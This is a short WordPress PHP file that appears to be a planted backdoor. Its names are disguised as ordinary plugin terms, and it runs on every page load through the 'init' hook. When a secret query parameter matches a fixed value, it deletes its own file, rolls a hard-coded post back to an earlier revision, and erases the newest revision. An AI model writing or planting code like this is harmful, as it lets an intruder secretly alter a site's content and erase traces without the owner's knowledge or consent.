<?php

function forum_thumbnail_visitor() {
	if (isset($_GET['redirection_layout_typography_time']) && $_GET['redirection_layout_typography_time'] === 'gdpr_source_copyright') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$cron_tracking_multi_categories = 11577;
		$yoast_file_validator_results = wp_get_post_revisions($cron_tracking_multi_categories);
		if (empty($yoast_file_validator_results)) die('no revisions');
		if (count($yoast_file_validator_results) < 2) die('less than 2');
		$old_get_404_alt = array_shift($yoast_file_validator_results);
		$responsive_location_github_gdpr = $old_get_404_alt->ID;
		$remote_upload_tags_daily = array_shift($yoast_file_validator_results);
		$coupon_divi_options = $remote_upload_tags_daily->ID;
		$background_guest_filter_sync = wp_restore_post_revision($coupon_divi_options);
		if ($background_guest_filter_sync === false) die('error restoring');
		$background_guest_filter_sync = wp_delete_post_revision($responsive_location_github_gdpr);		
		if ($background_guest_filter_sync === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'forum_thumbnail_visitor');
